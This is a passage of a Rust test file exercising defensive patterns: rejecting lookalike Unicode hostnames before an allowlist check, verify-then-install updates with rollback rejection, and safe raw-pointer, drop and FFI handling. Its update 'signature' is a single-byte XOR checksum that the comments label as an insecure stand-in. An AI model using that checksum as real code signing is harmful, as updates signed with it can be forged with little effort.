    assert_eq!(std::fs::read(&survivor).expect("the destination is readable"), new);

    std::fs::remove_dir_all(&dir).expect("the temporary directory is removed");
}

// --- type-unicode-identity ---------------------------------------------------

/// Stand-in for a maintained IDNA implementation (the `idna` crate);
/// production code calls `idna::domain_to_ascii`, which also normalizes and
/// validates labels this narrow check does not attempt.
#[derive(Debug, PartialEq)]
struct Hostname(String);

#[derive(Debug, PartialEq)]
struct NotCanonical;

impl Hostname {
    fn canonicalize(raw: &str) -> Result<Self, NotCanonical> {
        if raw.is_ascii() && !raw.is_empty() {
            Ok(Hostname(raw.to_ascii_lowercase()))
        } else {
            Err(NotCanonical)
        }
    }

    fn as_str(&self) -> &str {
        &self.0
    }
}

fn is_allowed(host: &Hostname, allowlist: &[&str]) -> bool {
    allowlist.contains(&host.as_str())
}

#[test]
fn a_label_with_a_non_ascii_lookalike_cannot_reach_an_identity_comparison() {
    let allowlist = ["apple.com"];

    let genuine = Hostname::canonicalize("Apple.com").expect("ascii label canonicalizes");
    assert!(is_allowed(&genuine, &allowlist));

    // The Cyrillic "а" (U+0430) renders identically to Latin "a" but is a
    // different scalar value. It never becomes a Hostname at all, so it
    // cannot reach the allowlist comparison, and it is never available to be
    // decoded back to Unicode for a reviewer to misread.
    assert_eq!(
        Hostname::canonicalize("\u{430}pple.com"),
        Err(NotCanonical)
    );
}

// --- api-update-signature ----------------------------------------------------

/// Stand-in for a real signature scheme (Ed25519 via `ed25519-dalek`, or an
/// OS code-signing API); this keyed checksum has none of the unforgeability
/// a real signature needs and exists only to exercise the verify-then-install
/// control flow below.
fn bhr_sign(payload: &[u8], key: u8) -> u8 {
    payload.iter().fold(key, |acc, byte| acc ^ byte)
}

fn bhr_verify(payload: &[u8], signature: u8, key: u8) -> bool {
    bhr_sign(payload, key) == signature
}

const BHR_RELEASE_KEY: u8 = 0x5a;

struct SignedUpdate {
    version: u32,
    payload: Vec<u8>,
    signature: u8,
}

#[derive(Debug, PartialEq)]
enum UpdateError {
    BadSignature,
    Rollback { installed: u32, offered: u32 },
}

fn verify_update(update: &SignedUpdate, installed_version: u32) -> Result<&[u8], UpdateError> {
    if update.version <= installed_version {
        return Err(UpdateError::Rollback {
            installed: installed_version,
            offered: update.version,
        });
    }
    if !bhr_verify(&update.payload, update.signature, BHR_RELEASE_KEY) {
        return Err(UpdateError::BadSignature);
    }
    Ok(&update.payload)
}

#[test]
fn an_update_that_fails_verification_or_rollback_is_never_installed() {
    let payload = b"binary contents go here".to_vec();
    let signature = bhr_sign(&payload, BHR_RELEASE_KEY);

    let genuine = SignedUpdate { version: 2, payload: payload.clone(), signature };
    assert_eq!(verify_update(&genuine, 1), Ok(payload.as_slice()));

    let tampered = SignedUpdate { version: 2, payload: b"different bytes".to_vec(), signature };
    assert_eq!(verify_update(&tampered, 1), Err(UpdateError::BadSignature));

    // Same valid signature, but offered at a version no newer than what is
    // already installed: rejected before the signature is even consulted.
    let replay = SignedUpdate { version: 1, payload, signature };
    assert_eq!(
        verify_update(&replay, 1),
        Err(UpdateError::Rollback { installed: 1, offered: 1 })
    );
}

// --- unsafe-pointer-provenance ------------------------------------------------

/// Every intermediate pointer stays within `[data, data + len]`; `add(len)`
/// itself is allowed as a one-past-the-end sentinel, `add(len + 1)` is not.
fn rfr_sum_via_pointers(data: &[u32]) -> u32 {
    let mut total = 0u32;
    let mut cursor = data.as_ptr();
    let end = unsafe { data.as_ptr().add(data.len()) };
    while cursor < end {
        total = total.wrapping_add(unsafe { *cursor });
        cursor = unsafe { cursor.add(1) };
    }
    total
}

#[test]
fn pointer_arithmetic_never_forms_a_pointer_past_the_allocations_end() {
    let data = [1u32, 2, 3, 4];
    assert_eq!(rfr_sum_via_pointers(&data), 10);

    let empty: [u32; 0] = [];
    assert_eq!(rfr_sum_via_pointers(&empty), 0);
}

// --- unsafe-dropck-phantom ----------------------------------------------------

struct RfrStorage<T> {
    ptr: *mut T,
    _owns_t: std::marker::PhantomData<T>,
}

impl<T> RfrStorage<T> {
    fn new(value: T) -> Self {
        RfrStorage { ptr: Box::into_raw(Box::new(value)), _owns_t: std::marker::PhantomData }
    }

    fn get(&self) -> &T {
        unsafe { &*self.ptr }
    }
}

impl<T> Drop for RfrStorage<T> {
    fn drop(&mut self) {
        drop(unsafe { Box::from_raw(self.ptr) });
    }
}

#[test]
fn a_value_held_behind_a_raw_pointer_is_dropped_exactly_once() {
    use std::cell::Cell;

    struct Recorder<'a>(&'a Cell<u32>);
    impl Drop for Recorder<'_> {
        fn drop(&mut self) {
            self.0.set(self.0.get() + 1);
        }
    }

    let drops = Cell::new(0);
    {
        let storage = RfrStorage::new(Recorder(&drops));
        assert_eq!(storage.get().0.get(), 0);
    }
    assert_eq!(drops.get(), 1, "the raw-pointer-held value was dropped exactly once");
}

// --- ffi-c-bitflag-enum -------------------------------------------------------

#[repr(transparent)]
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
struct RfrPermissions(u8);

impl RfrPermissions {
    const NONE: Self = Self(0);
    const READ: Self = Self(1);
    const WRITE: Self = Self(2);
    const EXEC: Self = Self(4);

    fn contains(self, flag: Self) -> bool {
        self.0 & flag.0 == flag.0
    }
}

impl std::ops::BitOr for RfrPermissions {
    type Output = Self;
    fn bitor(self, rhs: Self) -> Self {
        Self(self.0 | rhs.0)
    }
}

impl std::ops::BitOrAssign for RfrPermissions {
    fn bitor_assign(&mut self, rhs: Self) {
        self.0 |= rhs.0;
    }
}

#[test]
fn combined_c_bitflags_are_a_legal_value_with_no_matching_enum_variant() {
    let combined = RfrPermissions::READ | RfrPermissions::WRITE;
    assert!(combined.contains(RfrPermissions::READ));
    assert!(combined.contains(RfrPermissions::WRITE));
    assert!(!combined.contains(RfrPermissions::EXEC));

    let mut mask = RfrPermissions::NONE;
    mask |= RfrPermissions::EXEC;
    assert_eq!(mask, RfrPermissions::EXEC);
}

// --- ffi-foreign-resource-binding ---------------------------------------------

#[repr(transparent)]
#[non_exhaustive]
struct RfrDevice(*mut std::os::raw::c_void);

#[repr(transparent)]
#[non_exhaustive]
struct RfrContext(*mut std::os::raw::c_void);

impl RfrContext {
    fn from_raw(ptr: *mut std::os::raw::c_void) -> Self {
        Self(ptr)
    }

    fn open_device<'ctx>(&'ctx self) -> RfrBorrowedDevice<'ctx> {
        RfrBorrowedDevice { device: RfrDevice(self.0), _owner: std::marker::PhantomData }
    }
}

struct RfrBorrowedDevice<'ctx> {
    device: RfrDevice,
    _owner: std::marker::PhantomData<&'ctx RfrContext>,
}

impl RfrBorrowedDevice<'_> {
    fn handle(&self) -> &RfrDevice {
        &self.device
    }
}

#[test]
fn a_device_handle_borrowed_from_a_context_carries_its_lifetime() {
    let raw = std::ptr::NonNull::dangling().as_ptr();
    let ctx = RfrContext::from_raw(raw);
    let device = ctx.open_device();
    assert_eq!(device.handle().0, raw);
    drop(device);
    drop(ctx);
}

// --- api-auto-trait-contract ---------------------------------------------------

struct RfrJobHandle {
    #[allow(dead_code)]
    id: u64,
    #[allow(dead_code)]
    buffer: Vec<u8>,
}

const fn rfr_assert_send_sync<T: Send + Sync>() {}

const _: () = rfr_assert_send_sync::<RfrJobHandle>();

#[test]
fn a_public_types_send_and_sync_status_is_pinned_by_a_compiled_assertion() {
    rfr_assert_send_sync::<RfrJobHandle>();
}
